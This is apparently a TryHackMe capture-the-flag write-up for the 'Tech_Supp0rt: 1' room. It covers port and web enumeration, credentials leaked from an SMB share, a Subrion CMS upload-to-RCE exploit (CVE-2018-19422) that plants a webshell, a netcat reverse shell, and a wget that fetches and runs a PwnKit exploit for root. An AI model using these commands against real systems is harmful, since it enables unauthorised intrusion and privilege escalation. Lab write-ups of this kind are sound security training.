## Tech_Supp0rt: 1
https://tryhackme.com/room/techsupp0rt1

## Enum

```
nmap -sC -sV -sS $IP -T 4  -vv
```
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-12 23:19 JST
Scanning 10.10.195.180 [1000 ports]
Discovered open port 80/tcp on 10.10.195.180
Discovered open port 445/tcp on 10.10.195.180
Discovered open port 22/tcp on 10.10.195.180
Discovered open port 139/tcp on 10.10.195.180
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCtST3F95eem6k4V02TcUi7/Qtn3WvJGNfqpbE+7EVuN2etoFpihgP5LFK2i/EDbeIAiEPALjtKy3gFMEJ5QDCkglBYt3gUbYv29TQBdx+LZQ8Kjry7W+KCKXhkKJEVnkT5cN6lYZIGAkIAVXacZ/YxWjj+ruSAx07fnNLMkqsMR9VA+8w0L2BsXhzYAwCdWrfRf8CE1UEdJy6WIxRsxIYOk25o9R44KXOWT2F8pP2tFbNcvUMlUY6jGHmXgrIEwDiBHuwd3uG5cVVmxJCCSY6Ygr9Aa12nXmUE5QJE9lisYIPUn9IjbRFb2d2hZE2jQHq3WCGdAls2Bwnn7Rgc7J09
|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBClT+wif/EERxNcaeTiny8IrQ5Qn6uEM7QxRlouee7KWHrHXomCB/Bq4gJ95Lx5sRPQJhGOZMLZyQaKPTIaILNQ=
|   256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDolvqv0mvkrpBMhzpvuXHjJlRv/vpYhMabXxhkBxOwz
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-08-12T14:19:48
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: techsupport
|   NetBIOS computer name: TECHSUPPORT\x00
|   Domain name: \x00
|   FQDN: techsupport
|_  System time: 2022-08-12T19:49:46+05:30
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 64654/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 55806/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 61968/udp): CLEAN (Timeout)
|   Check 4 (port 14425/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -1h49m58s, deviation: 3h10m30s, median: 0s
```
```
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

```
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 314ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3777ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3771ms]
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 321ms]
phpinfo.php             [Status: 200, Size: 95037, Words: 4716, Lines: 1165, Duration: 461ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 323ms]
test                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 331ms]
wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 330ms]
:: Progress: [4713/4713] :: Job [1/1] :: 124 req/sec :: Duration: [0:00:44] :: Errors: 0 ::
```

```
wpscan --url http://$IP/wordpress/
```

```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://10.10.195.180/wordpress/ [10.10.195.180]
[+] Started: Fri Aug 12 23:29:57 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.195.180/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.195.180/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.195.180/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.195.180/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.7.2 identified (Insecure, released on 2021-05-12).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.195.180/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.2'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.195.180/wordpress/, Match: 'WordPress 5.7.2'

[+] WordPress theme in use: teczilla
 | Location: http://10.10.195.180/wordpress/wp-content/themes/teczilla/
 | Last Updated: 2022-08-09T00:00:00.000Z
 | Readme: http://10.10.195.180/wordpress/wp-content/themes/teczilla/readme.txt
 | [!] The version is out of date, the latest version is 1.1.4
 | Style URL: http://10.10.195.180/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2
 | Style Name: Teczilla
 | Style URI: https://www.avadantathemes.com/product/teczilla-free/
 | Description: Teczilla is a creative, fully customizable and multipurpose theme that you can use to create any kin...
 | Author: avadantathemes
 | Author URI: https://www.avadantathemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.195.180/wordpress/wp-content/themes/teczilla/style.css?ver=5.7.2, Match: 'Version: 1.0.4'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <==================================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Aug 12 23:30:24 2022

```
![1](https://user-images.githubusercontent.com/6504854/184480193-476b89d5-3a86-4363-9cc9-00d0a2b485d3.png)

```
david fahim
robert jacson
kiron jorge
support
```
🏴 I got some user name via wordpress site, tried to login and found support is enable user.

```
smbmap -H $IP
[+] Guest session       IP: 10.10.197.89:445    Name: 10.10.197.89
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        websvr                                                  READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (TechSupport server (Samba, Ubuntu))
```

```
smbclient //$IP/websvr
smb: \> ls
  .                                   D        0  Sat May 29 16:17:38 2021
  ..                                  D        0  Sat May 29 16:03:47 2021
  enter.txt                           N      273  Sat May 29 16:17:38 2021

smb: \> get enter.txt
```

```
cat enter.txt

GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:7s********************* [cooked with magical formula]
Wordpress creds
|->
```
🏴 Check /subrion and decrpt admin cred.

![image](https://user-images.githubusercontent.com/6504854/184480655-51d76793-0d0a-46c8-ab99-39994372e22c.png)

![image](https://user-images.githubusercontent.com/6504854/184482004-a90d72d0-a2c2-4a21-92e9-25a18e73c584.png)
![image](https://user-images.githubusercontent.com/6504854/184482094-67f9b116-6f4f-4693-ba44-b52b6f3dc928.png)

🏴 I could loggined as admin and found upload function but I couldn't connect via 403 error. 
Why....(Japanese people...) 🤷‍♀️

![image](https://user-images.githubusercontent.com/6504854/184483677-e80f6de2-c772-4e72-a1bf-1ab8956e0f58.png)

```
python3 49876.py -u http://10.10.53.38/subrion/panel/ -l admin -p S*******
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422

[+] Trying to connect to: http://10.10.53.38/subrion/panel/
[+] Success!
[+] Got CSRF token: tG8YM6SLHnlUUvcSVBPuwAIvKKq7VPXIxe2Z3x2P
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: muwmfutcbdrdhcg

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://10.10.53.38/subrion/panel/uploads/muwmfutcbdrdhcg.phar

$ ls
1.php
muwmfutcbdrdhcg.phar
```
🏴 Enable extention is "PHAR"???

```
$ mv 1.php 1.phar
```
🏴 I opened 1.phar with brouser and got user shell! It needs the live session loggined as admin.

## FLAG

```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.18.90.2] from (UNKNOWN) [10.10.53.38] 52652
Linux TechSupport 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 14:58:55 up 34 min,  0 users,  load average: 0.00, 0.01, 0.07
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ wget http://10.18.90.2/1.tar
--2022-08-13 14:59:22--  http://10.18.90.2/1.tar
HTTP request sent, awaiting response... 200 OK
1.tar: Permission denied
Cannot write to '1.tar' (Success).

$ cd tmp
$ wget http://10.18.90.2/1.tar
--2022-08-13 14:59:46--  http://10.18.90.2/1.tar
Saving to: '1.tar'

$ tar -xvf 1.tar
./cve-2021-4034
./cve-2021-4034.c

$ ./cve-2021-4034

cat /root/root.txt
```
Thank you for your time. Happy hacking 😄

We hits hurricane No8. 🌀🌀🌀🌀🌀🌀🌀🌀
